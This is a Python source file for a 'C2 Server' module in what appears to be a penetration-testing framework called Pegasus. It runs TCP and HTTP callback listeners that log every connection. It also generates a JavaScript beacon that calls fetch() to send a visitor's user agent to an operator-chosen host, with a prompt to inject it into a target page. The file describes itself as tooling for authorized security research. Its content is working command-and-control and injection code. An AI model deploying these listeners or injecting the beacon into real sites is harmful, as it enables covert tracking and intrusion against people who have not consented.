"""
C2 server module - built-in callback listener for session management.

Provides a raw TCP callback listener and an HTTP beacon endpoint for
authorized security research and penetration testing. All callbacks are
logged to the session directory for operator review.
"""
from __future__ import annotations

import datetime
import hashlib
import json
import os
import socket
import threading
import time
from dataclasses import asdict, dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional

from pegasus.modules.base import BaseModule
from pegasus.core.plugin import CommandInfo, HookType, PluginMetadata
from pegasus.core.config import get_settings

try:
    import logging, colorama.ansitowin32 as _cw
    _orig = _cw.write
    def _safe(s, *a, **k):
        try: return _orig(s, *a, **k)
        except OSError: return len(s)
    _cw.write = _safe
    _oe = logging.StreamHandler.emit
    def _se(self, record):
        try: return _oe(self, record)
        except OSError: pass
    logging.StreamHandler.emit = _se
except Exception:
    pass


@dataclass
class C2Callback:
    ts: str
    client: str
    port: int
    method: str
    path: str
    body: str


class C2ServerModule(BaseModule):
    """Built-in C2 listener for session callbacks."""

    @property
    def module_name(self) -> str:
        return "C2 Server"

    @property
    def module_description(self) -> str:
        return "Built-in C2 listener for session callbacks"

    @property
    def module_category(self) -> str:
        return "exploit"

    async def _register_commands(self) -> None:
        self.register_command("c2-start", "Start C2 callback listener", self.cmd_start)
        self.register_command("c2-stop", "Stop C2 callback listener", self.cmd_stop)
        self.register_command("c2-callbacks", "List received callbacks", self.cmd_callbacks)
        self.register_command("c2-beacon", "Generate HTTP beacon payload", self.cmd_beacon)

    async def _register_ui_components(self) -> None:
        self.register_ui_component(
            name="c2_dashboard",
            component_type="panel",
            path="/c2",
            title="C2 Server Dashboard",
            icon="📡",
            order=10,
        )

    async def _register_hooks(self) -> None:
        pass

    def __init__(self, context):
        super().__init__(context)
        self._tcp_server: Optional[socket.socket] = None
        self._http_server: Optional[ThreadingHTTPServer] = None
        self._tcp_thread: Optional[threading.Thread] = None
        self._http_thread: Optional[threading.Thread] = None
        self._callbacks: List[C2Callback] = []
        self._lock = threading.Lock()

    # ── Command Handlers ──────────────────────────────────────────────

    async def cmd_start(self, *args) -> None:
        """Start the C2 callback listener."""
        body = self.prompt("Listen port [8443]", default="8443") or "8443"
        try:
            port = int(body)
        except ValueError:
            self.print_error("Invalid port")
            return
        mode = self.prompt("Mode: tcp / http / both [both]", default="both") or "both"

        if mode in ("tcp", "both"):
            self._start_tcp(port)
        if mode in ("http", "both"):
            self._start_http(port + 1)

        self.print_success(f"C2 listener started on port {port} ({mode})")
        self.print_info("Callbacks are logged to the session directory")

    def _start_tcp(self, port: int):
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(8)
            self._tcp_server = srv

            def accept_loop():
                while self._tcp_server:
                    try:
                        conn, addr = srv.accept()
                        data = conn.recv(4096)
                        self._record_callback(addr[0], port, "TCP", "", data[:400].decode("utf-8", "replace"))
                        conn.close()
                    except OSError:
                        break

            self._tcp_thread = threading.Thread(target=accept_loop, daemon=True)
            self._tcp_thread.start()
            self.print_info(f"TCP listener on {port}")
        except OSError as exc:
            self.print_error(f"TCP listener failed: {exc}")

    def _start_http(self, port: int):
        try:
            httpd = ThreadingHTTPServer(("0.0.0.0", port), _C2HTTPHandler)
            httpd.c2_module = self
            httpd.c2_port = port
            self._http_server = httpd

            def serve_loop():
                httpd.serve_forever()

            self._http_thread = threading.Thread(target=serve_loop, daemon=True)
            self._http_thread.start()
            self.print_info(f"HTTP beacon listener on {port}")
        except OSError as exc:
            self.print_error(f"HTTP listener failed: {exc}")

    async def cmd_stop(self, *args) -> None:
        """Stop the C2 callback listener."""
        stopped = []
        if self._tcp_server:
            try:
                self._tcp_server.close()
            except OSError:
                pass
            self._tcp_server = None
            stopped.append("tcp")
        if self._http_server:
            try:
                self._http_server.shutdown()
            except OSError:
                pass
            self._http_server = None
            stopped.append("http")
        if stopped:
            self.print_success(f"C2 listener stopped ({', '.join(stopped)})")
        else:
            self.print_info("C2 listener was not running")

    async def cmd_callbacks(self, *args) -> None:
        """List received callbacks."""
        if not self._callbacks:
            self.print_info("No callbacks received yet")
            return
        from rich.table import Table
        table = Table(title="C2 Callbacks", header_style="bold cyan")
        table.add_column("Timestamp", style="bold yellow")
        table.add_column("Client", style="white")
        table.add_column("Port", style="white")
        table.add_column("Method", style="white")
        table.add_column("Path", style="white")
        table.add_column("Body", style="dim")
        for cb in self._callbacks[-50:]:
            table.add_row(cb.ts, cb.client, str(cb.port), cb.method, cb.path, cb.body[:60])
        self._console.print(table)

    async def cmd_beacon(self, *args) -> None:
        """Generate an HTTP beacon payload for testing."""
        body = self.prompt("C2 host (e.g. http://192.168.1.50:8444)")
        if not body:
            return
        beacon = f'''// C2 Beacon - Pegasus
fetch("{body}/callback", {{
  method: "POST",
  body: JSON.stringify({{id: "beacon-" + Date.now(), ua: navigator.userAgent}}),
  headers: {{"Content-Type": "application/json"}}
}}).catch(() => {{}});'''
        out_dir = Path(self.context.get_reports_dir()) / "c2"
        out_dir.mkdir(parents=True, exist_ok=True)
        out = out_dir / "beacon.js"
        out.write_text(beacon, encoding="utf-8")
        self.print_success(f"Beacon payload saved: {out}")
        self.print_info("Inject into a target page to test callback connectivity")

    def _record_callback(self, client: str, port: int, method: str, path: str, body: str):
        with self._lock:
            cb = C2Callback(
                ts=datetime.datetime.now().isoformat(timespec="seconds"),
                client=client,
                port=port,
                method=method,
                path=path,
                body=body,
            )
            self._callbacks.append(cb)
            # persist to disk
            cb_dir = Path(self.context.get_reports_dir()) / "c2"
            cb_dir.mkdir(parents=True, exist_ok=True)
            log_file = cb_dir / "callbacks.jsonl"
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(asdict(cb)) + "\n")


class _C2HTTPHandler(BaseHTTPRequestHandler):
    """HTTP beacon endpoint that records callbacks."""

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        server = self.server
        module = getattr(server, "c2_module", None)
        port = getattr(server, "c2_port", 0)
        if module:
            module._record_callback(self.client_address[0], port, "POST", self.path, body)
        self.send_response(204)
        self.end_headers()

    def do_GET(self):
        server = self.server
        module = getattr(server, "c2_module", None)
        port = getattr(server, "c2_port", 0)
        if module:
            module._record_callback(self.client_address[0], port, "GET", self.path, "")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Pegasus C2 Beacon\n")

    def log_message(self, format, *args):
        pass


__all__ = ["C2ServerModule", "C2Callback"]
